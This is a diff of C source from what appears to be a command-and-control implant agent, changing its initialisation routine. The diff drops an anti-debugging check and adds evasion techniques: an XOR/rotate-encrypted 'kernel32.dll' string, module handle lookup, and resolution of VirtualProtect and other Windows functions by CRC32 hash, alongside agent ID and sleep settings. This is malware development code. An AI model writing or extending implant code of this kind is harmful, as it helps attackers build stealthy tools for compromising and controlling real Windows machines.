@@ -11,10 +11,6 @@
 
 VOID RvntInit() {
 
-    if(IsDebugged()){
-        return;
-    }
-
     // Init Connection info
     // UserAgent and Host IP always obfuscated
     UCHAR s_xk[]        = S_XK;
@@ -40,13 +36,28 @@ VOID RvntInit() {
 
     // Init Win32
 #if CONFIG_ARCH == 64
-    PVOID ntdll_base = get_ntdll_64();
+    Instance.Handles.NtdllHandle = get_ntdll_64();
 #else
-    PVOID ntdll_base = get_ntdll_32();
+    Instance.Handles.NtdllHandle = get_ntdll_32();
 #endif
+
+#if CONFIG_OBFUSCATION
+    UCHAR s_string[] = S_KERNEL32;
+    UCHAR d_string[13] = {0};
+
+    ROL_AND_DECRYPT((CONST CHAR *)s_string, sizeof(s_string), 1, (CHAR*) d_string, (CONST CHAR *) s_xk);
+#else
+
+    UCHAR d_string[13] = {'k','e','r','n','e','l','3','2','.','d','l','l',0x0};
+
+#endif
+
+    Instance.Handles.Kernel32Handle = LocalGetModuleHandle(d_string);
+
     // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
-    Instance.Win32.RtlRandomEx   = GetProcAddressByHash(ntdll_base, RtlRandomEx_CRC32B);
-    Instance.Win32.RtlGetVersion = GetProcAddressByHash(ntdll_base, RtlGetVersion_CRC32B);
+    Instance.Win32.RtlRandomEx   = GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlRandomEx_CRC32B);
+    Instance.Win32.RtlGetVersion = GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlGetVersion_CRC32B);
+    Instance.Win32.VirtualProtect = GetProcAddressByHash(Instance.Handles.Kernel32Handle, VirtualProtect_CRC32B);
 
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
@@ -61,6 +72,8 @@ VOID RvntInit() {
     Instance.Session.OSArch = si.wProcessorArchitecture;
 
     Instance.Session.ProcArch = PROCESS_AGENT_ARCH ;
+
+
 }
 
 VOID AnonPipeRead( HANDLE hSTD_OUT_Read ) {
